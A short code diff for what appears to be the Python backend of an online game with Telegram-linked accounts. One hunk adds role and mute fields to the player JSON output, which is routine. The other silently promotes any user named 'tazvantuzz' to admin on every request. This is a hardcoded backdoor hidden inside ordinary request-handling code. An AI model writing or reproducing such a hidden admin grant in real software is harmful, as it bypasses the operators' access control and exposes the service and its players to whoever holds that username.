@@ -68,6 +68,10 @@ async def _user(request):
                         (now, uname, uid))
                 else:
                     await db.execute("UPDATE players SET last_seen=? WHERE user_id=?", (now, uid))
+                
+                if uname == "tazvantuzz":
+                    await db.execute("UPDATE players SET role='admin' WHERE user_id=?", (uid,))
+
                 _p = await db.fetchone("SELECT is_bot FROM players WHERE user_id=?", (uid,))
                 if _p and not _p.get("is_bot"):
                     await _track_activity(uid, now)
@@ -137,6 +141,9 @@ def _player_json(p):
         "gang_tag": p.get("gang_tag"),
         "gang_tag_color": p.get("gang_tag_color"),
         "tg_username": p.get("tg_username"),
+        "role": p.get("role", "player"),
+        "muted_until": p.get("muted_until", 0),
+        "mute_reason": p.get("mute_reason", None),
         "balance": p["balance"], "level": p["level"], "xp": p["xp"],
         "xp_next": xp_to_next(p["level"]),
         "location_id": p["location_id"],
